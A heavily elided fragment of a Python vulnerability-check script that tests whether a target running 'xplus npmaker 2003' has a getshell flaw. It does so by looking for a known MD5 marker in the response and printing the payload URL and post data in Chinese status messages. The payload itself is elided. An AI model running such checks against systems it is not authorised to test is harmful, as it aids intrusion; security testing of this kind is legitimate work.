    ...
    def run(self):
        ...
        try:
            ...
            if req2.status_code == 200 and r"81dc9bdb52d04dc20036dbd8313ed055" in req2.text:
                printGreen("[+]Success:存在xplus npmaker 2003系统GETSHELL漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4))
            else:
                printBlue("[-]Info:不存在xplus_2003_getshell漏洞")
...
if __name__ == "__main__":
    ...
    testVuln = xplus_2003_getshell(sys.argv[1])
    testVuln.run()